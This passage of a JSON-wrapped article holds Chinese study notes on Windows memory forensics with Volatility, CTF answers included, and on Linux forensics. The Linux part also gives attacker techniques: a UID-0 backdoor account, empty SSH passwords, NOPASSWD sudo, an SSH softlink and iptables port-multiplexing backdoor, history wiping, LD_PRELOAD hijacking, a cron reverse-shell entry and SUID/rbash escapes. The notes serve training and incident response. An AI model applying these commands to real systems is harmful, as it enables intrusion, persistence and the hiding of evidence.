/></p>\n<p>如图输入<code>volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump</code>之后每个账户后会出现两串hash值，一般来讲win2008以后第一个hash已经被弃用，所以只用第二个hash值。将hash值输入<a href=\"https://www.cmd5.com/\" rel=\"noopener noreferrer\" target=\"_blank\">md5在线解密破解,md5解密加密 (cmd5.com)</a>网站进行解密即可得到密码。</p>\n<p><img src=\"article-assets/forensics/c7fa0b72ff4e4ea6bb27.png\" alt=\"image-20230316155137156\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<pre><code class=\"language-cmd\">volatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 lsadump #从lsass注册表读取密码\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 iehistory #读取ie浏览器的历史记录\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan #读取端口连接状态 即系统执行netstat -an\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 notepad #显示正在打开的记事本中的内容 配合pslist\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist #读取可读取的注册表配置单元\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivedump -o 0xfffff80000ce3010 #读取所有hive\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff80000ce3010 -K &quot;SAM\\Domains\\Account\\Users\\000001F4&quot; #显示指定路径注册表项中的具体信息\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 userasslist #读取用户最后运行状态\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 filescan #扫描当前系统中的全部文件\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000065675500 -D file/ #-D表示保存路径\n#导出指定地址file目录下的所有文件至当前目录\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -p 520 -D file/ #导出所有520进程的dll文件\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 memdump -p 520 -D file/ #转储当前内存中的520进程\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 screenshot #获取当前系统的桌面截图\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan #扫描输出所有的服务名称\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline #命令行形式查看启动的服务&amp;程序\n</code></pre>\n<pre><code class=\"language-cmd\">#获取admin用户密码\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 lsadump #从lsass注册表读取密码\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码\n#IP和主机名\nipconfig\nnetstat -an\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan #读取端口连接状态 即系统执行netstat -an\nhostname\n\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName 注册表查看主机名 \nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist 通过该命令获取到\\REGISTRY\\MACHINE\\SYSTEM的偏移\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivedump -o 0xfffff8a000024010 &gt; 1.txt #导出\\REGISTRY\\MACHINE\\SYSTEM的所有子项 然后在1.txt中寻找computer或者name找到所需信息\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff8a000024010 -K  &quot;ControlSet001\\Control\\ComputerName\\ComputerName&quot; 直接输出注册表项内容拿下主机名\n#桌面flag.txt文件内容\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 filescan | findstr &quot;flag&quot; #直接找到flag.txt的信息和地址偏移\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfile -Q 0x00000007f1b6c10 -D file\\ #将偏移地址处的flag.txt放在file\\中\n拿到文件后正常查看即可得到flag\n#服务器中存在一个挖矿病毒 矿池地址是什么\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 netscan | findstr &quot;ESTABLISHED&quot; 寻找网络连接已连接的项目 直接拿到IP:PORT\n#恶意代码在系统中注册了服务 服务名是什么\n上一题中拿到了挖矿病毒的进程号PID 在进程列表中寻找对应的PID\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist | findstr &quot;2588&quot; #然后拿到了其父进程3036\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree 不停的对父进程溯源 寻找服务程序\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan &gt; svc.txt 进去查找进程号或其他相关信息\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline -p 3036 #也可以查到服务名\n#获取恶意进程的进程名PID\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist 上面命令大差不差\n#病毒在自我删除时执行的命令是什么\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 mendump -p 3036 -D file/ #导出所有3036进程的dll文件\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 mendump -p 2588 -D file/ #导出所有2588进程的dll文件\n病毒自我删除必然会调用delete，得到转储文件之后直接寻找delete字符查找\n</code></pre>\n<p><img src=\"article-assets/forensics/307a9f38149c25457284.png\" alt=\"image-20230316170338889\" loading=\"lazy\" decoding=\"async\" referrerpolicy=\"no-referrer\" /></p>\n<pre><code class=\"language-cmd\">#张三发现电脑中毒了，他折腾了下找到并删除了病毒，但过几天重要文件被盗，张三又发现了该病毒，请分析失窃原因。flag:flag(文件名32位md5)\nvolatility -f XpProTesting-Snapshot4.vmem imageinfo #先查看镜像信息\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hashdump #从lsass读取密码 可以直接看见隐藏账号\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist #查看进程发现metsvc.exe服务 400端口 即metasploit生成的后门程序\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 cmdline -p 400 #查看400号端口上的进程信息 直接拿到服务所在路径\n注册表服务路径：\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 svcscan #扫描输出服务信息\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 hivelist #查看注册单元 先拿到注册单元偏移\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -o 0xfffff8a000024010 -K &quot;ControlSet001\\Services\\metsvc&quot; #此处的命令拿到了netsvc的相关注册表\n用刚才拿到的netsvc相关注册表 对比 自启动的注册表项 再用64位32位系统再次排除\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 printkey -K &quot;Microsoft\\Windows\\CurrentVersion\\Run&quot; -o 0xfffff8a0004cc420\nValues:\nREG_SZ\t\t\tVMware User Process : (S) &quot;C:\\Program Files\\VMware Tools\\vmtoolsd.exe&quot; -n vmusr\nREG_SZ\t\t\tLneMosqIMIibhz : (S) C:\\Windows\\TEMP\\UEAOGWBdwyydm.vbs\n最终答案就是 flag{md5(UEAOGWBdwyydm.vbs)}\n#张三发现了异常账户登录，请找到该账户并分析来源\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pslist\nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 pstree\n溯源查找父进程 最终找到conhost.exe \nvolatility -f XpProTesting-Snapshot4.vmem --profile=WinXPSP2x86 dumpfiles -p 2632 -D file/\n通过右键该文件查看属性信息就可以找到 test$ 隐藏账户\n</code></pre>\n<p>win10 <a href=\"https://so.csdn.net/so/search?q=powershell&amp;spm=1001.2101.3001.7020\" rel=\"noopener noreferrer\" target=\"_blank\">powershell</a>的命令历史记录存储在</p>\n<pre><code class=\"language-powershell\">%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n</code></pre>\n<p>地址下的<code>ConsoleHost_history.txt</code></p>\n<p>可以删除某些或全部历史记录 在powershell中可以按上下方向键查询历史命令 或使用命令：</p>\n<pre><code class=\"language-powershell\">get-history\n</code></pre>\n<h1 id=\"section-30\">Linux Forensics</h1>\n<h2 id=\"section-31\">0x01 Information Gathering</h2>\n<pre><code class=\"language-shell\">uname -r #打印和系统有关的信息 其中内核版本是重要信息\ncat /proc/version #查看内核的具体信息\ncat /proc/cpuinfo #查看CPU信息\nenv #查看环境变量\n</code></pre>\n<h2 id=\"section-32\">0x02 Intetnet</h2>\n<pre><code class=\"language-shell\">netstat -antp #查看开放的tcp端口\nnetstat -anup #查看开放的udp端口\ntop #查看所有进程信息 类似于windows的管理器 排查异常进程\nps -ef #查看进程所对应的命令行源路径\nps -aux | grep &quot;PID&quot; #直接过滤查找对应的进程号的相关信息\nls -al /proc #该路径下的文件为当前机器的每个PID进程的配置文件等信息  \nls -al /proc/PID #直接查看该进程的文件\nsudo ls -al /proc/930/exe #查看该软连接所指向的路径\nsudo ls -al /proc/930/cwd #查看该文件的启动路径\nkill -9 PID #强制杀死指定的进程\n</code></pre>\n<h2 id=\"section-33\">0x03 User</h2>\n<h3 id=\"section-34\">Super User</h3>\n<p>uid = 0 (root)<br />\n可自己更改UID</p>\n<pre><code class=\"language-shell\">cat /etc/passwd #查看配置文件的用户信息 普通用户UID从1000开始 root的UID为0 服务用户为1-500 如果普通用户UID改为0再登陆便拥有root权限 改了不与root冲突\ncat /etc/shadow #查看密码文件\nawk -F: '$3==0 {print $1}' /etc/passwd #如果第三个参数为0 输出第一个参数 awk处理字符信息命令\n</code></pre>\n<p>可以将服务用户的字段更改为允许登录，同时为其修改UID=0获得root权限，就可以创建一个拥有root权限的服务账号作为后门使用</p>\n<h3 id=\"section-35\">Empty password</h3>\n<p>实战 后门常用</p>\n<pre><code class=\"language-shell\">passwd -d username #取消密码\necho &quot;PermitEmptyPasswords yes&quot; &gt;&gt; /etc/ssh/sshd_config #可以进行空口令登录\nservice sshd restart #更改过配置文件后需要重新启动服务来使配置文件生效\ncat secure* | grep none\n</code></pre>\n<h3 id=\"section-36\">Sudoers Account</h3>\n<p>/etc/sudoers文件时sudo的配置文件，是管理员集中的管理用户的使用权限和使用的主机。当用户执行sudo命令时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限，若确认用户具有可执行sudo的权限后，让用户输入密码在进行确认，但是root用户执行sudo时不需要输入密码，所以可利用此文件进行对配置允许特定用户在不用输入root密码的情况下使用所有命令。(提权经常出这种题)</p>\n<pre><code class=\"language-shell\">root\tALL=(ALL:ALL) ALL\npwn\t\tALL=(ALL:ALL) ALL #pwn用户拥有所有权限\n%pwn \tALL=(ALL:ALL) ALL #pwn组的用户拥有所有权限\npwn\t\tALL=(ALL:ALL) NOPASSWORD:ALL #即不输入密码就能拿到root权限\n</code></pre>\n<h3 id=\"section-37\">SSH Softlink</h3>\n<p>条件：需要配置/etc/ssh/sshd_config里面的UserPam为yes<br />\nln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=1111<br />\n利用权限将该软连接建立起来就可以直接用指定端口作为后门</p>\n<h3 id=\"section-38\">Certificate Login</h3>\n<pre><code class=\"language-shell\">#允许密钥认证(服务端)\nvim /etc/ssh/sshd_config\nRSAAuthentication yes\nPubkeyAuthentication yes\nStrictModes no\nsystemctl restart sshd\nssh-keygen -t rsa #形成一个公钥\ncat id_rsa.pub &gt; ~/.ssh/authorized_keys #将公钥导入证书路径下\nchmod -R 744 ~/.ssh #给证书权限\n</code></pre>\n<h2 id=\"section-39\">0x04 Log</h2>\n<h3 id=\"section-40\">History Log</h3>\n<p>命令历史记录存储在<code>~/.bash_history</code><br />\n正常情况下历史命令都是会被记录的<br />\n但是我们可以使用下面的命令来实现不记录的历史命令：<br />\n[空格]set +o history<br />\n继续记录<br />\n[空格]set -o history</p>\n<p>清除历史记录</p>\n<pre><code class=\"language-shell\">history -c\n</code></pre>\n<p>同时也可以将/root/.bash_history的内容覆盖来清除历史日志</p>\n<pre><code class=\"language-shell\">echo &gt; /root/.bash_history #输出空串覆盖\n</code></pre>\n<p>指定行记录删除</p>\n<pre><code class=\"language-shell\">history -d 10\n</code></pre>\n<p>/etc/profile配置文件<br />\n#显示命令时间</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# export HISTTIMEFORMAT='%F %T '\n</code></pre>\n<p>#设置最大记录长度</p>\n<pre><code class=\"language-shell\">export HISTSIZE=0 #不会进行历史记录\n</code></pre>\n<p>#在不想被记住的命令前输入一个空格-就不会被记住</p>\n<pre><code class=\"language-shell\">export HISTCONTROL=ignorespace\n</code></pre>\n<p>#忽略pwd、ls命令</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# export HISTIGNORE=&quot;pwd:ls:&quot;\n</code></pre>\n<p>#提出连续的相同命令条目，仅剩余一条</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# export HISTCONTROL=ignoredups\n</code></pre>\n<h3 id=\"section-41\">Logon Log</h3>\n<p>有关当前登录用户的信息记录在文件utmp中：==who命令<br />\n登陆进入和退出记录文件wtmp中：==w命令 last<br />\n最后一次登录文件可以用lastlog命令查看</p>\n<h2 id=\"section-42\">0x05 Permission maintenance</h2>\n<h3 id=\"section-43\">Hidden File</h3>\n<pre><code class=\"language-shell\">touch .1.php\ntouch /tmp/.ICE-unix\n</code></pre>\n<h3 id=\"section-44\">Read_only</h3>\n<pre><code class=\"language-shell\">chattr +ai test\n</code></pre>\n<h3 id=\"section-45\">Port multiplexing(Actual Combat)</h3>\n<p>转发端口 ssh socket http</p>\n<pre><code class=\"language-shell\">#server\nsudo iptables -t nat -N LETMEIN \nsudo iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-prot 22\nsudo iptables -A INPUT -p tcp -m string --string 'mulportcome' --algo bm -m recent --set --name letmein --rsource -j ACCEPT\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent -rcheck --seconds 3600 --name letmein --rsource -j LETMEIN\n#client\necho mulportcome | socat - tcp:192.168.235.129:80\nssh 192.168.235.129 -p 22\n</code></pre>\n<h3 id=\"section-46\">DLL Hijacking</h3>\n<p>应用程序在通过系统接口调用内核时会预先加载动态链接库，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.prelod配置文件中指定的动态链接库依然会被加载。<br />\nLD_PRELOAD用于预加载环境变量<br />\n/etc/ld.so.preload用于预加载配置文件<br />\n默认情况下LD_PRELOAD和/etc/ld.so.preload无配置<br />\n动态编译：不论程序依赖不依赖动态链接库，都会加载LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载<br />\n静态编译：不动态加载系统库文件，直接将程序所需要的各种文件全部集中到该软件平台中，这样就可以解决系统库文件被劫持，中了rookit等导致连接、网络等被隐藏的情况，常用工具如busybox</p>\n<p>前文可以看到Linux预加载的配置文件主要有两个：LD_PRELOAD和/etc/ld.so.preload，因此针对Linux的库文件劫持可以围绕这两个地方展开，目前主流的劫持技术主要有三种：<br />\n更改LD_PRELOAD环境变量、加载恶意库文件<br />\n/etc/ld.so.preload加载恶意的库文件(主流的劫持技术)<br />\n更改默认的库文件/etc/ld.so.preload为其他库文件</p>\n<h3 id=\"section-47\">cron(Actual Combat + CTF)</h3>\n<pre><code class=\"language-shell\">ls -al /etc/ (cron.d / cron.hourly / crontab / cron.daily / cron.monthly / cron.weekly) #etc下这些都是它的文件 其中crontab是它的全局配置文件\ncrontab -l #查看定时任务列表\ncrontab -e #配置定时列表\n* * * * * 此处跟一个反弹Shell的脚本文件 #5个*代表全部都是0 即每分钟执行一次 五个*按顺序表示是 分 时 一月(31天) 月份(12个月) 周(week)\nls /var/spool/cron/root\nls /var/spool/cron/crontabs/root #这两个路径都是全部的配置 做这种题应该把这几个路径全部看一遍\n</code></pre>\n<h3 id=\"section-48\">Foreground Program, Background Program, Daemons</h3>\n<p>前台程序，当执行时无法执行其他命令，比如ping 8.8.8.8<br />\n后台程序，执行时可以同时执行别的程序，比如ping 8.8.8.8 &amp;在执行时可以执行别的命令</p>\n<pre><code class=\"language-shell\">jobs -l #显示后台程序号\nfg id #执行后就会将当前后台程序放在前台运行 此时就不能同时在命令行执行别的指令了\n</code></pre>\n<p>Ctrl + C中断程序的时候，会向系统发送一个SIGHUP信号，程序就会自动退出。<br />\n有种无法被中断的程序，会一直运行除非系统关闭，这种进程被称为守护进程(Daemons)，比如systemctl、nohup、screen。</p>\n<pre><code class=\"language-shell\">screen ping 8.8.8.8 &amp; #输入之后ctrl+c关闭\nps aux | grep 'ping' #发现该命令作为守护进程依然在执行\n</code></pre>\n<h3 id=\"section-49\">Writable File(CTF+Promote Permissions)</h3>\n<pre><code class=\"language-shell\">/etc/passwd\nopenssl passwd -l -salt user pass\nuser:HASA:0:0:/root/root:/bin/bash\n</code></pre>\n<p>Other methods:</p>\n<pre><code class=\"language-shell\">perl -le 'print crypt(&quot;pass123&quot;, &quot;abc&quot;)'\npython -c 'import crypt; print crypt.crypt(&quot;pass&quot;, &quot;$6$salt&quot;)'\n</code></pre>\n<h3 id=\"section-50\">SUID(Promote Permissions)</h3>\n<p>是一种特殊权限，设置了SUID的程序文件，在用户执行该程序时，用户的权限时该程序文件属主的权限。<br />\n<a href=\"https://gtfobins.github.io/\" rel=\"noopener noreferrer\" target=\"_blank\">命令权限即时查询网站</a></p>\n<pre><code class=\"language-shell\">find / -perm -u=s -type f 2 &gt; /dev/null #从根目录中用户权限为S的文件 2 &gt; /dev/null是将一些标注错误输出到null文件中\nchmod u+s /bin/more\n</code></pre>\n<h2 id=\"section-51\">0x06 RBASH(CTFtarget+SandboxEscape)</h2>\n<p>Limit:</p>\n<blockquote>\n<p>不能使用cd命令(意味着不能更改目录)<br />\n不能设置或取消环境变量：SHELL、PATH、ENV、BASH_ENV<br />\n导入功能受限<br />\n指定包含参数'/'或'-'的文件名(即命中不能包含'/'或'-')<br />\n不能使用&gt;、&gt;|、&lt;&gt;、&gt;&amp;、&amp;&gt;、&gt;&gt;等重定向操作符<br />\n不能使用'set + r'或set + o''关闭</p>\n</blockquote>\n<p>Escape:</p>\n<blockquote>\n<p>1.Bypassing login:</p>\n<pre><code class=\"language-shell\">ssh trbash@192.168.8.185 -t &quot;bash --noprofile&quot;\n</code></pre>\n<p>2.Bypass Programming:</p>\n<pre><code class=\"language-shell\">python -c 'import os;os.system(&quot;/bin/bash&quot;)'\n</code></pre>\n<p><code>php / perl / raw / lue</code> etc...</p>\n<p>3.System common commands</p>\n<pre><code class=\"language-bash\">vim xx #进入之后\n:set shell=/bin/sh #命令输入模式后输入shell 直接绕过\n\nman xx\n!sh #直接sh 斜杠会被限制\n\ncp /bin/sh . #将sh拷贝到当前目录并执行也可以绕过\n#刚才SUID部分中的网站可以查找拥有shell的命令 点击进入就有操作方法\n</code></pre>\n</blockquote>\n",
+  "toc": [
+    {
+      "id": "section-1",
+      "text": "Information Forensics",
+      "level": 1,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-2",
+      "text": "0x01 Respond*",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-3",
+      "text": "InformationGathering",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-17",
+      "text": "MaintainTheFirstScene",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-18",
+      "text": "LogTypeOfAnalysis",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-19",
+      "text": "0x02 Blocking",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-20",
+      "text": "0x03 Analyse*",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-21",
+      "text": "1)Data、Traffic、SampleAnalysis",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-22",
+      "text": "2)Behavior Analysis & Restore Attack Process",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-23",
+      "text": "0x04 Clean*",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-24",
+      "text": "1)Non-adversarial",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-25",
+      "text": "2)Adversarial",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-28",
+      "text": "0x05 Reinforce*",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-29",
+      "text": "Memory Forensics",
+      "level": 1,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-30",
+      "text": "Linux Forensics",
+      "level": 1,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-31",
+      "text": "0x01 Information Gathering",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-32",
+      "text": "0x02 Intetnet",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-33",
+      "text": "0x03 User",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-34",
+      "text": "Super User",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-35",
+      "text": "Empty password",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-36",
+      "text": "Sudoers Account",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-37",
+      "text": "SSH Softlink",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-38",
+      "text": "Certificate Login",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-39",
+      "text": "0x04 Log",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-40",
+      "text": "History Log",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-41",
+      "text": "Logon Log",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-42",
+      "text": "0x05 Permission maintenance",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-43",
+      "text": "Hidden File",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-44",
+      "text": "Read_only",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-45",
+      "text": "Port multiplexing(Actual Combat)",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-46",
+      "text": "DLL Hijacking",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-47",
+      "text": "cron(Actual Combat + CTF)",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-48",
+      "text": "Foreground Program, Background Program, Daemons",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-49",
+      "text": "Writable File(CTF+Promote Permissions)",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-50",
+      "text": "SUID(Promote Permissions)",
+      "level": 3,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    },
+    {
+      "id": "section-51",
+      "text": "0x06 RBASH(CTFtarget+SandboxEscape)",
+      "level": 2,
+      "chapterIndex": 0,
+      "chapterId": "chapter-1"
+    }
+  ],
+  "readingMinutes": 45,
+  "markdownUrl": "articles/forensics.md",
+  "sourceOriginal": true,
+  "chapters": [],
+  "searchUrl": "data/articles/forensics/search.json",
+  "modifiedAt": "2024-10-12"
+}
